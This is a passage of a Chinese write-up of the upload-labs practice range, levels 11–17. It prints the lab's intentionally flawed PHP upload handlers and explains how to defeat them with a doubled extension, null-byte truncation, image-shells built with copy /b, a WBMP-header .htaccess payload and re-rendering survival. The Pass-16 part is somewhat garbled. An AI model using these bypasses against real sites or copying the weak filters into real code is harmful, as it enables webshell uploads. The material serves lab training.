+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-9-2"><span class="x">$msg = null;</span>
+</span><span id="__span-9-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-9-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-9-5"><span class="x">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);</span>
+</span><span id="__span-9-6">
+</span><span id="__span-9-7"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-9-8"><span class="x">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span>
+</span><span id="__span-9-9"><span class="x">        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-9-10"><span class="x">        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        </span>
+</span><span id="__span-9-11"><span class="x">        if (move_uploaded_file($temp_file, $img_path)) {</span>
+</span><span id="__span-9-12"><span class="x">            $is_upload = true;</span>
+</span><span id="__span-9-13"><span class="x">        } else {</span>
+</span><span id="__span-9-14"><span class="x">            $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-9-15"><span class="x">        }</span>
+</span><span id="__span-9-16"><span class="x">    } else {</span>
+</span><span id="__span-9-17"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-9-18"><span class="x">    }</span>
+</span><span id="__span-9-19"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 在后端源码中，我们看到了一个很新鲜的东西：<code>$file_name = str_ireplace($deny_ext,"", $file_name);</code>，他的意思是将deny_ext 中的违规数组名全部替换为空，但是它只会去替换一次，所以我们便去将我们的php后缀改为<code>.phphpp</code>
+这样，等它执行完替换操作后，上传到后端的文件的后缀便刚好变成了.php</p>
+<h2 id="pass-12-get-0x00">Pass-12 白名单校验 (GET 型 0x00 截断)<a class="headerlink" href="#pass-12-get-0x00" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong>漏洞描述：</strong> 使用白名单限制上传文件类型，但上传文件的存放路径可控</p>
+<p><strong>%00截断的条件是：</strong> php版本要小于5.3.4 修改php.ini的magic_quotes_gpc为OFF状态</p>
+</blockquote>
+<ol>
+<li>关于0x00截断，你可以理解为当文件从前往后读取，当某一时刻读取到0x00时，便会停止读取之后的内容。
+如：filename=1.php%00.txt  就是  filename=1.php</li>
+<li>还是看一看后端代码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-10-2"><span class="x">$msg = null;</span>
+</span><span id="__span-10-3"><span class="x">if(isset($_POST[&#39;submit&#39;])){</span>
+</span><span id="__span-10-4"><span class="x">    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span>
+</span><span id="__span-10-5"><span class="x">    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span>
+</span><span id="__span-10-6"><span class="x">    if(in_array($file_ext,$ext_arr)){</span>
+</span><span id="__span-10-7"><span class="x">        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-10-8"><span class="x">        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span>
+</span><span id="__span-10-9">
+</span><span id="__span-10-10"><span class="x">        if(move_uploaded_file($temp_file,$img_path)){</span>
+</span><span id="__span-10-11"><span class="x">            $is_upload = true;</span>
+</span><span id="__span-10-12"><span class="x">        } else {</span>
+</span><span id="__span-10-13"><span class="x">            $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-10-14"><span class="x">        }</span>
+</span><span id="__span-10-15"><span class="x">    } else{</span>
+</span><span id="__span-10-16"><span class="x">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span>
+</span><span id="__span-10-17"><span class="x">    }</span>
+</span><span id="__span-10-18"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+首先可以看到一个白名单<code>ext_arr</code> ，只有在此数组中的后缀名才能通过。
+接着我们看到
+<code>$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);</code>，</p>
+<p>这个东西的意思是：（第一个参数：在什么东西上面执行操作，这里是文件名），（第二个参数：从第几位开始读取（这里是先找到文件名中的最后一个点，然后在+1，意思是获取点之后的字符串）），（其实还有第三个参数，但是这里没有用））</p>
+<ol>
+<li><code>$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;</code>这个可以看到他是先GET获取要保存的文件的路径，然后用随机数和时间戳作为文件名，最后将文件后缀拼接上去，我们依旧是上传假冒jpg格式文件，用Burp抓包，然后修改内容，如下图：<img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/15.jpg" /></li>
+<li>至于为什么要加这些内容，请听我解释：修改的地方是文件要存储的路径，我们加上<code>.php%00</code>之后，文件名称会拼接在这后面，但是这时候的拼接已经没有用了，因为%00截断了，也就是说留下来的只有.php。这便起到了我们想要的效果。</li>
+<li>这一关是GET型的，也就是说不需要用Burp，直接在url中添加<code>1.php%00</code>也可以。</li>
+</ol>
+<h2 id="pass-13-post-0x00">Pass-13 白名单校验 ( POST 型 0x00 截断)<a class="headerlink" href="#pass-13-post-0x00" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>上一关是%00截断，而这一关是0x00截断，这是为啥，因为上一关是GET型的，直接在url中编码，而这一关是编程语言的编码</p>
+</li>
+<li>
+<p>我们依旧是Burp抓包修改，但是不是直接写为<code>.php0x00</code>，下图为错误示例：</p>
+</li>
+</ol>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/16.jpg" /></p>
+<ol>
+<li>
+<p>这里其实应该写为1.php (php后面有一个空格)，然后选中这个空格（额……wo真的选中了，这个Burp显示有问题）然后在右边，将hex内容改为00，点击“应用修改”，放行拦截到的数据包即可</p>
+</li>
+<li>
+<p>需要注意的是：因为是 POST 型，所以需要在 16 进制中修改，因为 POST 不会像 GET 那 样对%00 进行自动解码。</p>
+</li>
+</ol>
+<h2 id="pass-14">Pass-14 文件内容检测 (文件头校验)<a class="headerlink" href="#pass-14" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong>先了解了解文件头：</strong>
+JPEG/JFIF(常见的照片格式): 头两个字节为·0xFF·0xD8
+PNG(无损压缩格式):头两个字节为·0x89·0x50
+GIF (支持动画的图像格式): 头两个字节为·0x47·0x49
+BMP(Windows位图格式): 头两个字节为·0x42·0x4D
+TIFF (标签图像文件格式): 头两个字节可以是不同的数值</p>
+</blockquote>
+<ol>
+<li>我们看看后端代码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><span class="x">function getReailFileType($filename){</span>
+</span><span id="__span-11-2"><span class="x">    $file = fopen($filename, &quot;rb&quot;);</span>
+</span><span id="__span-11-3"><span class="x">    $bin = fread($file, 2); //只读2字节</span>
+</span><span id="__span-11-4"><span class="x">    fclose($file);</span>
+</span><span id="__span-11-5"><span class="x">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span>
+</span><span id="__span-11-6"><span class="x">    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    </span>
+</span><span id="__span-11-7"><span class="x">    $fileType = &#39;&#39;;    </span>
+</span><span id="__span-11-8"><span class="x">    switch($typeCode){      </span>
+</span><span id="__span-11-9"><span class="x">        case 255216:            </span>
+</span><span id="__span-11-10"><span class="x">            $fileType = &#39;jpg&#39;;</span>
+</span><span id="__span-11-11"><span class="x">            break;</span>
+</span><span id="__span-11-12"><span class="x">        case 13780:            </span>
+</span><span id="__span-11-13"><span class="x">            $fileType = &#39;png&#39;;</span>
+</span><span id="__span-11-14"><span class="x">            break;        </span>
+</span><span id="__span-11-15"><span class="x">        case 7173:            </span>
+</span><span id="__span-11-16"><span class="x">            $fileType = &#39;gif&#39;;</span>
+</span><span id="__span-11-17"><span class="x">            break;</span>
+</span><span id="__span-11-18"><span class="x">        default:            </span>
+</span><span id="__span-11-19"><span class="x">            $fileType = &#39;unknown&#39;;</span>
+</span><span id="__span-11-20"><span class="x">        }    </span>
+</span><span id="__span-11-21"><span class="x">        return $fileType;</span>
+</span><span id="__span-11-22"><span class="x">}</span>
+</span><span id="__span-11-23">
+</span><span id="__span-11-24"><span class="x">$is_upload = false;</span>
+</span><span id="__span-11-25"><span class="x">$msg = null;</span>
+</span><span id="__span-11-26"><span class="x">if(isset($_POST[&#39;submit&#39;])){</span>
+</span><span id="__span-11-27"><span class="x">    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-11-28"><span class="x">    $file_type = getReailFileType($temp_file);</span>
+</span><span id="__span-11-29">
+</span><span id="__span-11-30"><span class="x">    if($file_type == &#39;unknown&#39;){</span>
+</span><span id="__span-11-31"><span class="x">        $msg = &quot;文件未知，上传失败！&quot;;</span>
+</span><span id="__span-11-32"><span class="x">    }else{</span>
+</span><span id="__span-11-33"><span class="x">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span>
+</span><span id="__span-11-34"><span class="x">        if(move_uploaded_file($temp_file,$img_path)){</span>
+</span><span id="__span-11-35"><span class="x">            $is_upload = true;</span>
+</span><span id="__span-11-36"><span class="x">        } else {</span>
+</span><span id="__span-11-37"><span class="x">            $msg = &quot;上传出错！&quot;;</span>
+</span><span id="__span-11-38"><span class="x">        }</span>
+</span><span id="__span-11-39"><span class="x">    }</span>
+</span><span id="__span-11-40"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+其中 <code>$file = fopen($filename, "rb");</code>表示以只读（r）、二进制（b）格式打开文件，然后<code>$bin = fread($file, 2);</code> 只读2字节，再之后，将其转换为十进制编码与文件头进行比较从而得知文件类型。</p>
+<ol>
+<li>这个可以用两种方法解决：<blockquote>
+<p><strong>第一种：</strong>
+在 cmd 里执行 copy logo.jpg/b+test.php/a   test.jpg
+logo.jpg 为任意图片
+test.php 为我们要插入的木马代码
+test.jpg 为我们要创建的图片马</p>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p><strong>第二种：</strong>
+直接用010editor等软件进行修改</p>
+</blockquote>
+<ol>
+<li>但其实这时候用蚁剑连接也无法连接，因为它仍然是被当作图片等格式解析的，我们看一看upload-labs的关卡界面，它说要“使用文件包含漏洞能运行图片马中的恶意代码”，所以我们使用文件包含漏洞即可</li>
+</ol>
+<h2 id="pass-15-getimagesize">Pass-15 文件内容检测 (getimagesize()校验)<a class="headerlink" href="#pass-15-getimagesize" title="Permanent link">&para;</a></h2>
+<ol>
+<li>观察源码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><span class="x">function isImage($filename){</span>
+</span><span id="__span-12-2"><span class="x">    $types = &#39;.jpeg|.png|.gif&#39;;</span>
+</span><span id="__span-12-3"><span class="x">    if(file_exists($filename)){</span>
+</span><span id="__span-12-4"><span class="x">        $info = getimagesize($filename);</span>
+</span><span id="__span-12-5"><span class="x">        $ext = image_type_to_extension($info[2]);</span>
+</span><span id="__span-12-6"><span class="x">        if(stripos($types,$ext)&gt;=0){</span>
+</span><span id="__span-12-7"><span class="x">            return $ext;</span>
+</span><span id="__span-12-8"><span class="x">        }else{</span>
+</span><span id="__span-12-9"><span class="x">            return false;</span>
+</span><span id="__span-12-10"><span class="x">        }</span>
+</span><span id="__span-12-11"><span class="x">    }else{</span>
+</span><span id="__span-12-12"><span class="x">        return false;</span>
+</span><span id="__span-12-13"><span class="x">    }</span>
+</span><span id="__span-12-14"><span class="x">}</span>
+</span><span id="__span-12-15">
+</span><span id="__span-12-16"><span class="x">$is_upload = false;</span>
+</span><span id="__span-12-17"><span class="x">$msg = null;</span>
+</span><span id="__span-12-18"><span class="x">if(isset($_POST[&#39;submit&#39;])){</span>
+</span><span id="__span-12-19"><span class="x">    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-12-20"><span class="x">    $res = isImage($temp_file);</span>
+</span><span id="__span-12-21"><span class="x">    if(!$res){</span>
+</span><span id="__span-12-22"><span class="x">        $msg = &quot;文件未知，上传失败！&quot;;</span>
+</span><span id="__span-12-23"><span class="x">    }else{</span>
+</span><span id="__span-12-24"><span class="x">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span>
+</span><span id="__span-12-25"><span class="x">        if(move_uploaded_file($temp_file,$img_path)){</span>
+</span><span id="__span-12-26"><span class="x">            $is_upload = true;</span>
+</span><span id="__span-12-27"><span class="x">        } else {</span>
+</span><span id="__span-12-28"><span class="x">            $msg = &quot;上传出错！&quot;;</span>
+</span><span id="__span-12-29"><span class="x">        }</span>
+</span><span id="__span-12-30"><span class="x">    }</span>
+</span><span id="__span-12-31"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 这关与上一关类似，但是它是用<code>getimagesize()</code>对图片做了校验。其余操作相同。</p>
+<blockquote>
+<p><strong>getimagesize() 函数返回一个包含图像信息的数组。该数组的索引如下所示:</strong> </p>
+<p>索引0: 图像的宽度 (单位:像素)
+索引1: 图像的高度 (单位:像素)
+索引2: 图像类型的常量值(可以使用 image type to_mimetype() 函数将其转换为 MIME 类型),型，返回的是数字,其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
+索引3: 包含图像属性的字符串，以逗号分隔 (如width=500,height=300)
+索引 bits 给出的是图像的每种颜色的位数，二进制格式
+索引 channels 给出的是图像的通道值，RGB 图像默认是 3
+索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息
+<br>
+如果getimagesize()函数无法读取图像信息，则返回false。否则，返回一个包含上述索引的数组。</p>
+</blockquote>
+<h2 id="pass-16-exif_imagetype">Pass-16 文件内容检测 (exif_imagetype()绕过)<a class="headerlink" href="#pass-16-exif_imagetype" title="Permanent link">&para;</a></h2>
+<ol>
+<li>漏洞描述：利用 php 内置函数 exif_imagetype()获取图片类型 (需要开启 php_exif 模块)</li>
+<li>
+<p>预定义高度宽度：
+例 .htaccess 文件
+文件内容:</p>
+</li>
+<li>
+<p>利用 x00x00x8ax39x8ax39 文件头x00x00x8ax30x8ax39 是 wbmp 文件的文件头，但 0x00在.htaccess 文件中为是注释符，不会影响文件本身。使用十六进制编辑器或者 python 的 bytes 字符类型(b’’)来进行添加。
+payload:shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00" + '文件内容'</p>
+</li>
+<li>其实其他操作和前几关一样</li>
+</ol>
+<h2 id="pass-17">Pass-17 文件内容检测 (二次渲染)<a class="headerlink" href="#pass-17" title="Permanent link">&para;</a></h2>
+<ol>
+<li>查看源码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span>
+<span class="normal">72</span>
+<span class="normal">73</span>
+<span class="normal">74</span>
+<span class="normal">75</span>
+<span class="normal">76</span>
+<span class="normal">77</span>
+<span class="normal">78</span>
+<span class="normal">79</span>
+<span class="normal">80</span>
+<span class="normal">81</span>
+<span class="normal">82</span>
+<span class="normal">83</span>
+<span class="normal">84</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-13-2"><span class="x">$msg = null;</span>
+</span><span id="__span-13-3"><span class="x">if (isset($_POST[&#39;submit&#39;])){</span>
+</span><span id="__span-13-4"><span class="x">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>
+</span><span id="__span-13-5"><span class="x">    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span>
+</span><span id="__span-13-6"><span class="x">    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];</span>
+</span><span id="__span-13-7"><span class="x">    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-13-8">
+</span><span id="__span-13-9"><span class="x">    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);</span>
+</span><span id="__span-13-10">
+</span><span id="__span-13-11"><span class="x">    // 获得上传文件的扩展名</span>
+</span><span id="__span-13-12"><span class="x">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span>
+</span><span id="__span-13-13">
+</span><span id="__span-13-14"><span class="x">    //判断文件后缀与类型，合法才进行上传操作</span>
+</span><span id="__span-13-15"><span class="x">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){</span>
+</span><span id="__span-13-16"><span class="x">        if(move_uploaded_file($tmpname,$target_path)){</span>
+</span><span id="__span-13-17"><span class="x">            //使用上传的图片生成新的图片</span>
+</span><span id="__span-13-18"><span class="x">            $im = imagecreatefromjpeg($target_path);</span>
+</span><span id="__span-13-19">
+</span><span id="__span-13-20"><span class="x">            if($im == false){</span>
+</span><span id="__span-13-21"><span class="x">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span>
+</span><span id="__span-13-22"><span class="x">                @unlink($target_path);</span>
+</span><span id="__span-13-23"><span class="x">            }else{</span>
+</span><span id="__span-13-24"><span class="x">                //给新图片指定文件名</span>
+</span><span id="__span-13-25"><span class="x">                srand(time());</span>
+</span><span id="__span-13-26"><span class="x">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span>
+</span><span id="__span-13-27"><span class="x">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
+</span><span id="__span-13-28"><span class="x">                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;</span>
+</span><span id="__span-13-29"><span class="x">                imagejpeg($im,$img_path);</span>
+</span><span id="__span-13-30"><span class="x">                @unlink($target_path);</span>
+</span><span id="__span-13-31"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-13-32"><span class="x">            }</span>
+</span><span id="__span-13-33"><span class="x">        } else {</span>
+</span><span id="__span-13-34"><span class="x">            $msg = &quot;上传出错！&quot;;</span>
+</span><span id="__span-13-35"><span class="x">        }</span>
+</span><span id="__span-13-36">
+</span><span id="__span-13-37"><span class="x">    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){</span>
+</span><span id="__span-13-38"><span class="x">        if(move_uploaded_file($tmpname,$target_path)){</span>
+</span><span id="__span-13-39"><span class="x">            //使用上传的图片生成新的图片</span>
+</span><span id="__span-13-40"><span class="x">            $im = imagecreatefrompng($target_path);</span>
+</span><span id="__span-13-41">
+</span><span id="__span-13-42"><span class="x">            if($im == false){</span>
+</span><span id="__span-13-43"><span class="x">                $msg = &quot;该文件不是png格式的图片！&quot;;</span>
+</span><span id="__span-13-44"><span class="x">                @unlink($target_path);</span>
+</span><span id="__span-13-45"><span class="x">            }else{</span>
+</span><span id="__span-13-46"><span class="x">                 //给新图片指定文件名</span>
+</span><span id="__span-13-47"><span class="x">                srand(time());</span>
+</span><span id="__span-13-48"><span class="x">                $newfilename = strval(rand()).&quot;.png&quot;;</span>
+</span><span id="__span-13-49"><span class="x">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
+</span><span id="__span-13-50"><span class="x">                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;</span>
+</span><span id="__span-13-51"><span class="x">                imagepng($im,$img_path);</span>
+</span><span id="__span-13-52">
+</span><span id="__span-13-53"><span class="x">                @unlink($target_path);</span>
+</span><span id="__span-13-54"><span class="x">                $is_upload = true;               </span>
+</span><span id="__span-13-55"><span class="x">            }</span>
+</span><span id="__span-13-56"><span class="x">        } else {</span>
+</span><span id="__span-13-57"><span class="x">            $msg = &quot;上传出错！&quot;;</span>
+</span><span id="__span-13-58"><span class="x">        }</span>
+</span><span id="__span-13-59">
+</span><span id="__span-13-60"><span class="x">    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){</span>
+</span><span id="__span-13-61"><span class="x">        if(move_uploaded_file($tmpname,$target_path)){</span>
+</span><span id="__span-13-62"><span class="x">            //使用上传的图片生成新的图片</span>
+</span><span id="__span-13-63"><span class="x">            $im = imagecreatefromgif($target_path);</span>
+</span><span id="__span-13-64"><span class="x">            if($im == false){</span>
+</span><span id="__span-13-65"><span class="x">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span>
+</span><span id="__span-13-66"><span class="x">                @unlink($target_path);</span>
+</span><span id="__span-13-67"><span class="x">            }else{</span>
+</span><span id="__span-13-68"><span class="x">                //给新图片指定文件名</span>
+</span><span id="__span-13-69"><span class="x">                srand(time());</span>
+</span><span id="__span-13-70"><span class="x">                $newfilename = strval(rand()).&quot;.gif&quot;;</span>
+</span><span id="__span-13-71"><span class="x">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
+</span><span id="__span-13-72"><span class="x">                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;</span>
+</span><span id="__span-13-73"><span class="x">                imagegif($im,$img_path);</span>
+</span><span id="__span-13-74">
+</span><span id="__span-13-75"><span class="x">                @unlink($target_path);</span>
+</span><span id="__span-13-76"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-13-77"><span class="x">            }</span>
+</span><span id="__span-13-78"><span class="x">        } else {</span>
+</span><span id="__span-13-79"><span class="x">            $msg = &quot;上传出错！&quot;;</span>
+</span><span id="__span-13-80"><span class="x">        }</span>
+</span><span id="__span-13-81"><span class="x">    }else{</span>
+</span><span id="__span-13-82"><span class="x">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span>
+</span><span id="__span-13-83"><span class="x">    }</span>
+</span><span id="__span-13-84"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 在源码中有这么一句比较特殊，也是这一关的重点： <code>$im = imagecreatefrompng($target_path);</code>这个的意思是对图片进行重新渲染，也就是说，将图片格式之外的内容会被删去，就比如说我们之前用 cmd 里执行 <code>copy logo.jpg/b+test.php/a test.jpg</code>生成的图片，其文件末尾会有php语句，而在二次渲染之后就会消失。</p>
+<ol>
+<li>
+<p>基于此，我们尝试去绕过，我们先上传一个合法的gif文件，（至于为什么用.gif 而不用.jpg 或者是.png ,我们之后再说），上传之后，我们在页面上右键图片，然后将上传到服务器的图片下载到本地。</p>
+</li>
+<li>
+<p>这时候，我们先比较比较经过渲染之后的图片与原图片有何区别，我们打开010editor，然后选择“比较文件”，分别选择两张图片，再点击“匹配”，然后再其中插入东西。</p>
+</li>
+</ol>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/18.jpg" /><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0f1444e29f3441be94f17f2f3eff8cac.jpeg#pic_center" /></p>
+<ol>
+<li>
+<p>这时候我们有两种方法，一种是在最初的图片上做修改，第二种是在经过第一次渲染之后的图片上做修改</p>
+</li>
+<li>
+<p>先说第一种，我们将我们的PHP语句插入到未经修改的部分（最好靠后一些），然后再将插入php语句的照片上传。再次下载下上传到服务器的照片可以发现里面的PHP语句并没有被删除。
+  <img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/20.jpg" />
